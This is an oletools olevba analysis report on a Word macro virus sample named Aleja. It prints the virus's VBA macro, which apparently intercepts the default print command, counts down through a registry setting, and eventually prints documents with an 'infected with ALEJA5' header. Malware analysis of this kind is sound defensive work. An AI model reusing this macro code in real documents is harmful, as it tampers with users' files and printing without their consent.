olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Aleja-2798ca4c0b1f05210ea68fbe9c9483e651410845
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Aleja-2798ca4c0b1f05210ea68fbe9c9483e651410845 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ArchivoImprimirPredeter.bas 
in file: Virus.MSWord.Aleja-2798ca4c0b1f05210ea68fbe9c9483e651410845 - OLE stream: 'Macros/VBA/ArchivoImprimirPredeter'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub MAIN()

Valor = GetSetting(appname:="Aleja5", Section:="Inicio", _
                       Key:="Valor", Default:="50")

If Valor = 0 Then

With ActiveDocument.Sections(1)
    .Headers(wdHeaderFooterPrimary).Range.Cut
    .Headers(wdHeaderFooterPrimary).Range.Text = "Documento infectado con el virus ALEJA5"
    .Headers(wdHeaderFooterPrimary).Range.Font.Size = 12
    .Headers(wdHeaderFooterPrimary).Range.Font.Bold = True
End With

ActiveDocument.PrintOut

With ActiveDocument.Sections(1)
    .Headers(wdHeaderFooterPrimary).Range.Paste
End With

Valor = GetSetting(appname:="Aleja5", Section:="Inicio", _
                       Key:="Valor", Default:="50")

SaveSetting appname:="Aleja5", Section:="Inicio", _
            Key:="Valor", setting:=(1)
Else
    ActiveDocument.PrintOut
    SaveSetting appname:="Aleja5", Section:="Inicio", _
                Key:="Valor", setting:=(Valor - 1)
End If

End Sub






+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

